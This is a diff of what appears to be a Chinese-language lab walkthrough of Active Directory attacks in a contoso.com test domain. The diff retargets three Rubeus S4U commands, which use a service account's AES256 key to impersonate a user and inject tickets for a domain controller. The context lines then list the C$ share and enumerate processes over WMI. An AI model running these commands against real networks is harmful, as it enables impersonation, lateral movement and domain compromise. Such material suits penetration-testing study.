@@ -51,9 +51,9 @@ Invoke-Rubeus -Command "createnetonly /program:C:\Windows\system32\WindowsPowerS
 
 
 ```powershell
-Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:cifs/adsec-01.contoso.com /ptt"
-Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:host/adsec-01.contoso.com /ptt"
-Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:rpcss/adsec-01.contoso.com /ptt"
+Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:cifs/ad-01.contoso.com /ptt"
+Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:host/ad-01.contoso.com /ptt"
+Invoke-Rubeus -Command "s4u /user:taskservice /aes256:390F5466C4FCCB8A04955838C3890D067050B3035886ED97D8D96912E8E70C01 /impersonateuser:bwillis /msdsspn:rpcss/ad-01.contoso.com /ptt"
 ```
 
 列舉目前取得的kerberos ticket
@@ -73,4 +73,3 @@ ls \\ad-01.contoso.com\C$
 ```powershell
 Get-WmiObject -Class win32_process -ComputerName ad-01.contoso.com
 ```
-
